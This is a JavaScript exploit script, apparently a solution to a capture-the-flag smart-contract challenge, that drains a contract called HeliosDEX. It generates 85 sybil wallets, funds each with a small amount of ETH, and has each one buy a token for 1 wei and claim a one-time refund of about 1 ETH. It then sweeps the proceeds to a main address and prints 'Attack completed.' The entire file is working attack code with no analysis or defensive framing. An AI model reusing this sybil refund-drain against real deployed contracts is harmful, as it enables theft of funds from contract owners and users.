async function main() {
    // Adress to change with the one of the contract
    const heliosDEXAddress = "0xB5332D6B2659066cEBe8798D2B0B9ccAcff4b9a5";
    const mainAddress = "0xe8A543EF62AFc0bBEf98e2FC7FE535a860516be9";
  
    const [mainSigner] = await ethers.getSigners();
  
    const heliosDEXAbi = [
      "function swapForMAL() external payable",
      "function oneTimeRefund(address item, uint256 amount) external",
      "function malakarEssence() external view returns (address)"
    ];
  
    const erc20Abi = [
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];
  
    const dex = new ethers.Contract(heliosDEXAddress, heliosDEXAbi, mainSigner);
  
    const malTokenAddress = await dex.malakarEssence();
    console.log("Address of MAL token:", malTokenAddress);
  
    const numSybil = 85; // Change this to the number of sybil wallets you want to create to reach 20 ETH
    const fundingAmount = ethers.utils.parseEther("0.001");
  
    let sybilWallets = [];
    for (let i = 0; i < numSybil; i++) {
      let wallet = ethers.Wallet.createRandom().connect(ethers.provider);
      sybilWallets.push(wallet);
    }
    console.log(`Creation of ${numSybil} sybil wallets completed.`);
  
    console.log(`Funding each sybil wallet with ${ethers.utils.formatEther(fundingAmount)} ETH...`);
    for (const wallet of sybilWallets) {
      const txFund = await mainSigner.sendTransaction({
        to: wallet.address,
        value: fundingAmount,
      });
      await txFund.wait();
    }
    console.log("All sybil wallets funded.");
  
    let totalRefund = ethers.BigNumber.from("0");
  
    // For each sybil wallet, execute the attack
    for (const wallet of sybilWallets) {
      try {
        const dexWithSybil = new ethers.Contract(heliosDEXAddress, heliosDEXAbi, wallet);
        const malToken = new ethers.Contract(malTokenAddress, erc20Abi, wallet);
  
        // 1. Call swapForMAL to get 1 MAL token
        const txSwap = await dexWithSybil.swapForMAL({ value: 1 });
        await txSwap.wait();
  
        // 2. Approve the DEX to spend the MAL token
        const txApprove = await malToken.approve(heliosDEXAddress, 1);
        await txApprove.wait();
  
        // 3. Call oneTimeRefund to get 1 ETH back
        const txRefund = await dexWithSybil.oneTimeRefund(malTokenAddress, 1);
        await txRefund.wait();
  
        // 4. Retrieve the balance of the sybil wallet
        const sybilBalance = await wallet.getBalance();
        console.log(`Sybil wallet ${wallet.address} balance: ${ethers.utils.formatEther(sybilBalance)} ETH`);
  
        // 5. If the balance is greater than 0.0005 ETH, transfer the excess to the main address
        const gasBuffer = ethers.utils.parseEther("0.0005");
        if (sybilBalance.gt(gasBuffer)) {
          const txTransfer = await wallet.sendTransaction({
            to: mainAddress,
            value: sybilBalance.sub(gasBuffer),
          });
          await txTransfer.wait();
          totalRefund = totalRefund.add(sybilBalance.sub(gasBuffer));
        }
      } catch (err) {
        console.error(`Error with wallet ${wallet.address}: ${err.message}`);
      }
    }
  
    console.log("Total refund from sybil wallets to main address:", ethers.utils.formatEther(totalRefund), "ETH");
    console.log("Attack completed.");
  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
  